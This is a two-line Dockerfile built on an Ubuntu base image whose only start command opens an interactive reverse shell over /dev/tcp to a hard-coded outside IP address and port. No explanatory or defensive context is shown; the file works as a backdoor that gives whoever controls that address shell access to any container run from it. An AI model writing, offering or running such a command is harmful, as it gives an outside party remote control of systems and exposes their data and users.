FROM ubuntu:latest

CMD ["/bin/bash", "-c", "bash -i >& /dev/tcp/175.24.100.2/8888 0<&1 2>&1"]
